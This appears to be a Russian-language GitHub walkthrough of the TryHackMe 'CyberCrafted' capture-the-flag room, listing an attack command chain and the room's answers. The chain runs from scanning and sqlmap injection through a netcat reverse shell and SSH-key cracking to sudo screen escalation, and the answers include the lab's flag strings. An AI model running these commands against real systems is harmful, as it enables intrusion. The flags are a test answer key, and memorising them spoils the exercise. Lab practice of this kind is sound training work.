[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [CyberCrafted](https://tryhackme.com/r/room/cybercrafted) 

Всего 3 задания:
## Задание 1
Подключитесь к сети TryHackMe и разверните машину. Если вы не знаете, как подключиться к VPN, пожалуйста, заполните  
комнату OpenVPN  или используйте AttackBox, нажав кнопку Start AttackBox.

Обратите внимание, что загрузка этой машины может занять пару минут. Я бы рекомендовал дать ей не менее пяти минут.

### Ответьте на вопросы ниже
Готово.. Приготовьтесь...
```commandline
Go
```

## Задание 2
ы нашли IP-адрес сервера Minecraft, находящегося в разработке.  Можете ли вы получить root- доступ?

### Ответьте на вопросы ниже
Сколько портов открыто?
```commandline
nmap -T5  <IP>
dirsearch  -u <IP>
echo ‘<IP>    cybercrafted.thm’  >> /etc/hosts
dirsearch -u http://admin.cybercrafted.thm/
dirsearch -u http://store.cybercrafted.thm/
sqlmap -r req.req --dbms=mysql -D webapp -T admin –dump
id
rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc <IP> 4444 > f
scp id_rsa root@<IP>:/root/trytohackme/cybercraft/
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash -wordlist=/usr/share/wordlists/rockyou.txt
su cybercrafted
sudo -l
sudo /usr/bin/screen -r cybercrafted
```
```commandline
3
```
Какая служба работает на самом высоком порту?
```commandline

```
```commandline
minecraft
```
Есть ли поддомены? (В алфавитном порядке)
```commandline
admin store www
```
На какой странице вы нашли уязвимость?
```commandline
search.php
```
Какое имя пользователя у администратора? (С учетом регистра)
```commandline
xXUltimateCreeperXx
```
Что такое веб-флаг?
```commandline
THM{bbe315906038c3a62d9b195001f75008}
```
Можете ли вы получить флаг сервера Minecraft?
```commandline
THM{ba93767ae3db9f5b8399680040a0c99e}
```
Как называется этот сомнительный плагин?
```commandline
LoginSystem
```
Какой флаг у пользователя?
```commandline
THM{b4aa20aaf08f174473ab0325b24a45ca}
```
Заверши работу и дай мне корневой флаг!
```commandline
THM{8bb1eda065ceefb5795a245568350a70}
```

## Задание 3
И вот вам! Это было « Cybercrafted » от  madrinch .

Подписывайтесь на меня в  Twitter !

### Ответьте на вопросы ниже
Удачи в ваших будущих приключениях!
```commandline
Ответ не нужен
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)